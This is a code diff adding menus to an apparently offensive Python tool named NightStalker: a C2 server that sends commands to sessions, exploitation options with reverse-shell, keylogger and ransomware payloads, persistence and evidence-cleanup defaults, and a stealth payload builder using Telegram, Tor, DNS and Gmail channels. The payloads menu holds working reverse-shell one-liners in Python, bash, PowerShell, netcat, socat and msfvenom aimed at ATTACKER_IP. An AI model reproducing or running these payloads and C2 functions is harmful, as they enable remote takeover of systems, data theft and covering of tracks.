+                        print(f"🗑️ Files removed: {result.get('files_removed', 0)}")
+                        print(f"💾 Space freed: {result.get('space_freed', 'Unknown')}")
+                    else:
+                        print(f"❌ Cleanup failed: {result.get('error')}")
+                        
+                except Exception as e:
+                    print(f"❌ Error: {e}")
+                    
+            elif choice == '4':
+                print("\n🔧 Self-Rebuild")
+                print("-" * 10)
+                
+                backup = input("Create backup? (y/n): ").strip().lower() == 'y'
+                
+                try:
+                    env_manager = EnvironmentManager()
+                    result = env_manager.self_rebuild(backup)
+                    
+                    if result.get('success'):
+                        print("✅ Self-rebuild completed!")
+                        print(f"📁 New location: {result.get('path')}")
+                    else:
+                        print(f"❌ Self-rebuild failed: {result.get('error')}")
+                        
+                except Exception as e:
+                    print(f"❌ Error: {e}")
+                    
+            elif choice == '5':
+                return
+            else:
+                print("❌ Invalid option. Please select 1-5.")
+
+    def _handle_fuzzer_menu(self):
+        """Handle genetic fuzzer menu"""
+        from .redteam.fuzzer import GeneticFuzzer
+        
+        while True:
+            print("\n🧬 Genetic Fuzzer:")
+            print("  1. Start fuzzing")
+            print("  2. Load fuzzing session")
+            print("  3. Show fuzzing results")
+            print("  4. Back to Red Team menu")
+            
+            choice = input("Select option (1-4): ").strip()
+            
+            if choice == '1':
+                print("\n🧬 Start Genetic Fuzzing")
+                print("-" * 20)
+                
+                target = input("Target (URL/file/command): ").strip()
+                fuzz_type = input("Fuzz type (http/file/command): ").strip()
+                generations = input("Number of generations (default: 100): ").strip() or "100"
+                
+                try:
+                    fuzzer = GeneticFuzzer()
+                    result = fuzzer.start_fuzzing(target, fuzz_type, int(generations))
+                    
+                    if result.get('success'):
+                        print(f"✅ Fuzzing started!")
+                        print(f"🎯 Target: {result.get('target')}")
+                        print(f"🧬 Generations: {result.get('generations')}")
+                        print(f"📊 Session ID: {result.get('session_id')}")
+                    else:
+                        print(f"❌ Fuzzing failed: {result.get('error')}")
+                        
+                except Exception as e:
+                    print(f"❌ Error: {e}")
+                    
+            elif choice == '2':
+                print("\n📂 Load Fuzzing Session")
+                print("-" * 20)
+                
+                session_id = input("Session ID: ").strip()
+                
+                try:
+                    fuzzer = GeneticFuzzer()
+                    result = fuzzer.load_session(session_id)
+                    
+                    if result.get('success'):
+                        print(f"✅ Session loaded!")
+                        print(f"📊 Progress: {result.get('progress', 0)}%")
+                        print(f"🎯 Target: {result.get('target')}")
+                    else:
+                        print(f"❌ Session load failed: {result.get('error')}")
+                        
+                except Exception as e:
+                    print(f"❌ Error: {e}")
+                    
+            elif choice == '3':
+                try:
+                    fuzzer = GeneticFuzzer()
+                    results = fuzzer.get_results()
+                    
+                    if results:
+                        print("\n📊 Fuzzing Results:")
+                        for result in results:
+                            print(f"  • {result['target']}: {result['crashes']} crashes, {result['hangs']} hangs")
+                    else:
+                        print("📊 No fuzzing results available")
+                        
+                except Exception as e:
+                    print(f"❌ Error: {e}")
+                    
+            elif choice == '4':
+                return
+            else:
+                print("❌ Invalid option. Please select 1-4.")
+
+    def _handle_redteam_c2_menu(self):
+        """Handle red team C2 menu"""
+        from .redteam.c2.command_control import C2Server, C2Client
+        
+        while True:
+            print("\n🎮 Red Team C2 Operations:")
+            print("  1. Deploy C2 server")
+            print("  2. Connect to C2 server")
+            print("  3. List active sessions")
+            print("  4. Send command to session")
+            print("  5. Back to Red Team menu")
+            
+            choice = input("Select option (1-5): ").strip()
+            
+            if choice == '1':
+                print("\n🎮 Deploy C2 Server")
+                print("-" * 15)
+                
+                host = input("Host (default: 0.0.0.0): ").strip() or "0.0.0.0"
+                port = input("Port (default: 4444): ").strip() or "4444"
+                encryption = input("Use encryption? (y/n): ").strip().lower() == 'y'
+                
+                try:
+                    server = C2Server(host, int(port), encryption)
+                    result = server.start()
+                    
+                    if result.get('success'):
+                        print(f"✅ C2 server started!")
+                        print(f"🌐 Listening on {host}:{port}")
+                        print(f"🔒 Encryption: {encryption}")
+                    else:
+                        print(f"❌ Server start failed: {result.get('error')}")
+                        
+                except Exception as e:
+                    print(f"❌ Error: {e}")
+                    
+            elif choice == '2':
+                print("\n🔗 Connect to C2 Server")
+                print("-" * 20)
+                
+                host = input("Server host: ").strip()
+                port = input("Server port: ").strip()
+                
+                try:
+                    client = C2Client(host, int(port))
+                    result = client.connect()
+                    
+                    if result.get('success'):
+                        print(f"✅ Connected to C2 server!")
+                        print(f"🆔 Session ID: {result.get('session_id')}")
+                    else:
+                        print(f"❌ Connection failed: {result.get('error')}")
+                        
+                except Exception as e:
+                    print(f"❌ Error: {e}")
+                    
+            elif choice == '3':
+                try:
+                    server = C2Server()
+                    sessions = server.list_sessions()
+                    
+                    if sessions:
+                        print("\n📊 Active Sessions:")
+                        for session in sessions:
+                            print(f"  • {session['id']}: {session['ip']} - {session['status']}")
+                    else:
+                        print("📊 No active sessions")
+                        
+                except Exception as e:
+                    print(f"❌ Error: {e}")
+                    
+            elif choice == '4':
+                print("\n💻 Send Command")
+                print("-" * 12)
+                
+                session_id = input("Session ID: ").strip()
+                command = input("Command: ").strip()
+                
+                try:
+                    server = C2Server()
+                    result = server.send_command(session_id, command)
+                    
+                    if result.get('success'):
+                        print(f"✅ Command sent!")
+                        print(f"📤 Output: {result.get('output', 'No output')}")
+                    else:
+                        print(f"❌ Command failed: {result.get('error')}")
+                        
+                except Exception as e:
+                    print(f"❌ Error: {e}")
+                    
+            elif choice == '5':
+                return
+            else:
+                print("❌ Invalid option. Please select 1-5.")
 
     def _handle_exfil_menu(self):
         """Handle data exfiltration menu"""
@@ -1100,6 +2097,243 @@ For detailed help on each group or subcommand, use:
                 return  # Return to main menu
             else:
                 print("Invalid option. Please select 1-2.")
+                
+    def _handle_advanced_exploitation_menu(self):
+        """Handle advanced exploitation menu"""
+        while True:
+            print("\n💀 Advanced Exploitation:")
+            print("  1. Single Target Exploitation")
+            print("  2. Attack Chains")
+            print("  3. Reconnaissance")
+            print("  4. Generate Report")
+            print("  5. Back to Red Team menu")
+            
+            choice = input("Select option (1-5): ").strip()
+            
+            if choice == '1':
+                self._handle_single_exploitation()
+            elif choice == '2':
+                self._handle_attack_chains()
+            elif choice == '3':
+                self._handle_reconnaissance()
+            elif choice == '4':
+                self._handle_report_generation()
+            elif choice == '5':
+                return
+            else:
+                print("❌ Invalid option. Please select 1-5.")
+                
+    def _handle_single_exploitation(self):
+        """Handle single target exploitation"""
+        print("\n🎯 Single Target Exploitation")
+        print("-" * 40)
+        
+        try:
+            # Get target information
+            target = input("Target IP/hostname: ").strip()
+            exploit_type = input("Exploitation type (web/network/social/physical/supply_chain): ").strip()
+            payload_type = input("Payload type (reverse_shell/keylogger/ransomware): ").strip() or "reverse_shell"
+            
+            # Advanced options
+            stealth_level = int(input("Stealth level (1-10, default 8): ").strip() or "8")
+            persistence = input("Establish persistence? (y/n, default y): ").strip().lower() != 'n'
+            cleanup = input("Clean up evidence? (y/n, default y): ").strip().lower() != 'n'
+            
+            # Create exploitation configuration
+            exploit_config = ExploitConfig(
+                target=target,
+                exploit_type=ExploitType(exploit_type),
+                payload_type=payload_type,
+                stealth_level=stealth_level,
+                persistence=persistence,
+                cleanup=cleanup
+            )
+            
+            # Initialize and execute
+            print(f"\n[*] Starting exploitation of {target}...")
+            exploitation = AdvancedExploitation()
+            results = exploitation.execute_exploit(exploit_config)
+            
+            # Display results
+            if results.get('success', False):
+                print(f"✅ Exploitation successful on {target}")
+                if results.get('payload_deployed', False):
+                    print(f"✅ Payload deployed successfully")
+                if results.get('persistence_established', False):
+                    print(f"✅ Persistence established")
+                if results.get('c2_established', False):
+                    print(f"✅ Command and control established")
+            else:
+                print(f"❌ Exploitation failed on {target}")
+                if 'error' in results:
+                    print(f"❌ Error: {results['error']}")
+            
+            # Save results
+            save_report = input("\nSave detailed report? (y/n): ").strip().lower() == 'y'
+            if save_report:
+                report_path = f"exploitation_report_{target}_{int(time.time())}.html"
+                html_report = exploitation.generate_report(target, results, "html")
+                with open(report_path, 'w') as f:
+                    f.write(html_report)
+                print(f"✅ HTML report saved to {report_path}")
+                
+        except Exception as e:
+            print(f"❌ Exploitation error: {e}")
+            
+        input("\nPress Enter to continue...")
+        
+    def _handle_attack_chains(self):
+        """Handle attack chains"""
+        print("\n🔗 Attack Chains")
+        print("-" * 40)
+        
+        try:
+            target = input("Target IP/hostname: ").strip()
+            
+            print("\nAvailable attack chains:")
+            print("1. web_to_system - Web application to system compromise")
+            print("2. network_to_domain - Network to domain compromise")
+            print("3. social_to_physical - Social engineering to physical access")
+            
+            chain_choice = input("Select attack chain (1-3): ").strip()
+            
+            chain_map = {
+                '1': 'web_to_system',
+                '2': 'network_to_domain',
+                '3': 'social_to_physical'
+            }
+            
+            chain_type = chain_map.get(chain_choice)
+            if not chain_type:
+                print("❌ Invalid chain selection")
+                return
+            
+            # Execute attack chain
+            print(f"\n[*] Executing {chain_type} attack chain on {target}...")
+            exploitation = AdvancedExploitation()
+            results = exploitation.run_attack_chain(target, chain_type)
+            
+            # Display results
+            if results.get('success', False):
+                print(f"✅ Attack chain successful on {target}")
+                phases = results.get('phases', {})
+                for phase_name, phase_result in phases.items():
+                    if phase_result.get('success', False):
+                        print(f"✅ {phase_name.replace('_', ' ').title()}: Success")
+                    else:
+                        print(f"❌ {phase_name.replace('_', ' ').title()}: Failed")
+            else:
+                print(f"❌ Attack chain failed on {target}")
+                if 'error' in results:
+                    print(f"❌ Error: {results['error']}")
+            
+            # Save results
+            save_report = input("\nSave detailed report? (y/n): ").strip().lower() == 'y'
+            if save_report:
+                report_path = f"attack_chain_{chain_type}_{target}_{int(time.time())}.html"
+                html_report = exploitation.generate_report(target, results, "html")
+                with open(report_path, 'w') as f:
+                    f.write(html_report)
+                print(f"✅ HTML report saved to {report_path}")
+                
+        except Exception as e:
+            print(f"❌ Attack chain error: {e}")
+            
+        input("\nPress Enter to continue...")
+        
+    def _handle_reconnaissance(self):
+        """Handle reconnaissance operations"""
+        print("\n🔍 Reconnaissance")
+        print("-" * 40)
+        
+        try:
+            target = input("Target IP/hostname: ").strip()
+            
+            print("\nReconnaissance types:")
+            print("1. comprehensive - Full reconnaissance")
+            print("2. web - Web application focused")
+            print("3. network - Network focused")
+            
+            scan_type = input("Select scan type (1-3): ").strip()
+            
+            scan_map = {
+                '1': 'comprehensive',
+                '2': 'web',
+                '3': 'network'
+            }
+            
+            scan_choice = scan_map.get(scan_type, 'comprehensive')
+            
+            # Execute reconnaissance
+            print(f"\n[*] Starting {scan_choice} reconnaissance on {target}...")
+            exploitation = AdvancedExploitation()
+            results = exploitation.run_reconnaissance(target, scan_choice)
+            
+            # Display results
+            print(f"\n📊 Reconnaissance Results for {target}:")
+            print(f"Open ports: {len(results.get('ports', []))}")
+            print(f"Services: {len(results.get('services', []))}")
+            print(f"Web applications: {len(results.get('web_apps', []))}")
+            print(f"Vulnerabilities: {len(results.get('vulnerabilities', []))}")
+            
+            if results.get('web_apps'):
+                print("\n🌐 Web Applications:")
+                for app in results['web_apps']:
+                    print(f"  - {app.get('url', 'Unknown')} ({app.get('server', 'Unknown')})")
+            
+            if results.get('vulnerabilities'):
+                print("\n⚠️ Vulnerabilities:")
+                for vuln in results['vulnerabilities'][:5]:  # Show first 5
+                    print(f"  - {vuln.get('vulnerability', 'Unknown')} ({vuln.get('severity', 'Unknown')})")
+            
+            # Save results
+            save_report = input("\nSave reconnaissance report? (y/n): ").strip().lower() == 'y'
+            if save_report:
+                report_path = f"reconnaissance_{target}_{int(time.time())}.json"
+                with open(report_path, 'w') as f:
+                    json.dump(results, f, indent=2)
+                print(f"✅ Reconnaissance report saved to {report_path}")
+                
+        except Exception as e:
+            print(f"❌ Reconnaissance error: {e}")
+            
+        input("\nPress Enter to continue...")
+        
+    def _handle_report_generation(self):
+        """Handle report generation"""
+        print("\n📋 Report Generation")
+        print("-" * 40)
+        
+        try:
+            target = input("Target IP/hostname: ").strip()
+            report_file = input("Results file path (JSON): ").strip()
+            
+            if not os.path.exists(report_file):
+                print(f"❌ Results file not found: {report_file}")
+                return
+            
+            # Load results
+            with open(report_file, 'r') as f:
+                results = json.load(f)
+            
+            # Generate report
+            print(f"\n[*] Generating report for {target}...")
+            exploitation = AdvancedExploitation()
+            
+            report_format = input("Report format (html/json, default html): ").strip() or "html"
+            report_path = f"report_{target}_{int(time.time())}.{report_format}"
+            
+            report_content = exploitation.generate_report(target, results, report_format)
+            
+            with open(report_path, 'w') as f:
+                f.write(report_content)
+            
+            print(f"✅ Report saved to {report_path}")
+            
+        except Exception as e:
+            print(f"❌ Report generation error: {e}")
+            
+        input("\nPress Enter to continue...")
 
     def _handle_monitor_menu(self):
         """Handle file monitoring menu"""
@@ -1281,6 +2515,63 @@ For detailed help on each group or subcommand, use:
                 print("Invalid option. Please select 1-4.")
 
 
+def stealth_server_menu():
+    try:
+        from .redteam.payload_builder import StealthPayloadBuilder
+        builder = StealthPayloadBuilder()
+        print("[Stealth Server] Start C2 server for stealth payloads.")
+        host = input("Host (default 0.0.0.0): ").strip() or '0.0.0.0'
+        port = input("Port (default 4444): ").strip() or '4444'
+        key = input("Encryption key (optional): ").strip() or None
+        options = {'host': host, 'port': int(port)}
+        if key:
+            options['encryption_key'] = key
+        result = builder.start_server(options)
+        if result.get('success'):
+            print(f"C2 server started on {result['host']}:{result['port']}")
+            if result.get('key'):
+                print(f"Encryption key: {result['key']}")
+        else:
+            print(f"Failed to start C2 server: {result.get('error')}")
+    except Exception as e:
+        print(f"[Error] {e}")
+    input("Press Enter to return to the main menu...")
+
+def stealth_payload_builder_menu():
+    try:
+        from .redteam.payload_builder import StealthPayloadBuilder
+        builder = StealthPayloadBuilder()
+        print("[Stealth Payload Builder] Build a new stealth payload.")
+        print("Available channels: telegram, tor, dns, https, gmail")
+        channel = input("Channel type: ").strip()
+        options = {}
+        if channel == 'telegram':
+            options['bot_token'] = input("Bot token: ").strip()
+            options['chat_id'] = input("Chat ID: ").strip()
+        elif channel == 'tor':
+            options['hidden_service_dir'] = input("Hidden service dir: ").strip()
+        elif channel == 'dns':
+            options['domain'] = input("Domain: ").strip()
+            options['dns_server'] = input("DNS server: ").strip()
+        elif channel == 'https':
+            options['server_url'] = input("Server URL: ").strip()
+            options['api_key'] = input("API Key: ").strip()
+        elif channel == 'gmail':
+            options['credentials_file'] = input("Credentials file: ").strip()
+            options['user_id'] = input("User ID: ").strip()
+        else:
+            print("Unknown channel.")
+            input("Press Enter to return...")
+            return
+        success = builder.setup_channel(channel, **options)
+        if success:
+            print(f"Stealth payload for {channel} created.")
+        else:
+            print("Failed to create stealth payload.")
+    except Exception as e:
+        print(f"[Error] {e}")
+    input("Press Enter to return to the main menu...")
+
 def main():
     """Main entry point for NightStalker CLI"""
     cli = NightStalkerCLI()
@@ -1320,7 +2611,7 @@ def main():
                 print("\n\nExiting NightStalker. Goodbye!")
                 return 0
             except Exception as e:
-                print(f"\n[!] Error: {e}")
+                logger.error(f"\n[!] Error: {e}", exc_info=True)
                 continue
         
     try:
@@ -1343,9 +2634,118 @@ def main():
         print("\n[!] Operation cancelled by user")
         return 1
     except Exception as e:
-        logger.error(f"CLI error: {e}")
+        logger.error(f"CLI error: {e}", exc_info=True)
         return 1
 
 
+def payloads_menu():
+    from .redteam.payload_builder import PayloadBuilder
+    builder = PayloadBuilder()
+    while True:
+        print("""
+Payloads Menu
+1. List Payloads
+2. Create New Payload
+3. Add Example Payloads
+4. Back
+""")
+        choice = input("Select an option: ").strip()
+        if choice == '1':
+            try:
+                payloads = builder.list_payloads()
+                if not payloads:
+                    print("No payloads found. Would you like to create one? (y/n)")
+                    if input().strip().lower() == 'y':
+                        continue  # Go to create new payload
+                else:
+                    print("Available payloads:")
+                    for p in payloads:
+                        print(f"- {p}")
+            except Exception as e:
+                print(f"[Error] {e}")
+            input("Press Enter to return...")
+        elif choice == '2':
+            try:
+                payload_type = input("Enter payload type (e.g., keylogger, ransomware, reverse_shell): ").strip()
+                format = input("Enter format (python, bash, exe, dll, powershell): ").strip()
+                print("Paste or type your payload code here (end with a blank line):")
+                lines = []
+                while True:
+                    line = input()
+                    if not line:
+                        break
+                    lines.append(line)
+                code = '\n'.join(lines)
+                builder.add_payload(payload_type, {format: code})
+                builder.save_payloads()
+                print(f"Payload '{payload_type}' created.")
+            except Exception as e:
+                print(f"[Error] {e}")
+            input("Press Enter to return...")
+        elif choice == '3':
+            try:
+                # Add example payloads
+                templates = {
+                    'keylogger': {'python': 'import pynput.keyboard\n...'},
+                    'ransomware': {'python': 'import os\n... # ransomware logic'},
+                    'downloader': {'python': 'import requests\n... # downloader logic'},
+                    'persistence': {'python': 'import os\n... # persistence logic'},
+                    'reverse_shell_python': {'python': 'import socket,subprocess,os\ns=socket.socket()\ns.connect(("ATTACKER_IP",PORT))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nimport pty; pty.spawn("/bin/bash")'},
+                    'reverse_shell_bash': {'bash': 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'},
+                    'reverse_shell_powershell': {'powershell': 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\"ATTACKER_IP\",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'},
+                    'reverse_shell_netcat': {'bash': 'nc -e /bin/bash ATTACKER_IP PORT'},
+                    'reverse_shell_socat': {'bash': 'socat TCP:ATTACKER_IP:PORT EXEC:/bin/bash'},
+                    'reverse_shell_meterpreter': {'bash': 'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f elf > met.elf'},
+                }
+                for name, code in templates.items():
+                    builder.add_payload(name, code)
+                builder.save_payloads()
+                print("Example payloads added.")
+            except Exception as e:
+                print(f"[Error] {e}")
+            input("Press Enter to return...")
+        elif choice == '4':
+            break
+        else:
+            print("Invalid choice. Please try again.")
+
+
+def main_menu():
+    while True:
+        print("""
+NightStalker Main Menu
+1. Payloads
+2. Stealth Server
+3. Stealth Payload Builder
+4. Red Team Operations
+5. Web Red Teaming
+6. C2 Operations
+7. Exit
+""")
+        choice = input("Select an option: ").strip()
+        if choice == '1':
+            try:
+                payloads_menu()
+            except Exception as e:
+                print(f"[Error] {e}")
+        elif choice == '2':
+            stealth_server_menu()
+        elif choice == '3':
+            stealth_payload_builder_menu()
+        elif choice == '4':
+            print("[Red Team Operations] (Feature coming in next step)")
+            input("Press Enter to return to the main menu...")
+        elif choice == '5':
+            print("[Web Red Teaming] (Feature coming in next step)")
+            input("Press Enter to return to the main menu...")
+        elif choice == '6':
+            print("[C2 Operations] (Feature coming in next step)")
+            input("Press Enter to return to the main menu...")
+        elif choice == '7':
+            print("Exiting NightStalker.")
+            break
+        else:
+            print("Invalid choice. Please try again.")
+
 if __name__ == "__main__":
-    sys.exit(main()) 
+    main_menu() 
